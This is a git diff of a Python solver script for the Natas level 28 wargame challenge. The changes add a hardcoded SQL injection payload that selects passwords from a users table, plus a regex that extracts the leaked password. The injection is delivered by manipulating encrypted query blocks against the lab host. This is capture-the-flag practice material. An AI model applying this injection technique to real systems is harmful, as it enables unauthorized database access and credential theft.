@@ -5,18 +5,17 @@ import sys
 import subprocess
 import requests
 from requests.auth import HTTPBasicAuth
+import re
 
 passw = subprocess.run(['getpass', '28'], stdout=subprocess.PIPE).stdout.decode('utf-8')
 auth = HTTPBasicAuth('natas28', passw.strip())
 
-def find_query():
+def inject_payload(p):
     payload = bytearray()
     ppart = 'a'*10
-    #print(ppart)
     payload.extend(ppart.encode())
-    charr = get_padding(bytes(sys.argv[1].encode()))
+    charr = get_padding(bytes(p.encode()))
     payload.extend(charr)
-    print(payload)
     r = requests.get('http://natas28.natas.labs.overthewire.org/index.php/', auth=auth, params={b'query':bytes(payload)}, allow_redirects=False)
     query = r.headers['Location']
     return query[18:]
@@ -49,14 +48,14 @@ def split_newline(response):
                 s += response[32*i:32*i+32]
     return s
 def get_response(query):
-    print(query)
     payload = bytes.fromhex(query)
     payload = base64.b64encode(payload)
-    print(bytes(payload))
     r = requests.get('http://natas28.natas.labs.overthewire.org/search.php/', auth=auth, params={b'query':bytes(payload)}, allow_redirects=False)
     response = r.text
     return response.split("\n", 14)[14]
 
 if __name__ == '__main__':
-    print(get_response(split_newline(url_base64_to_hex(find_query()))))
+    payload = 'SELECT password AS joke FROM users AS jokes;'
+    pass_reg = '[a-zA-Z0-9]{32}'
+    print(re.findall(pass_reg, get_response(split_newline(url_base64_to_hex(inject_payload(payload)))))[0])
 
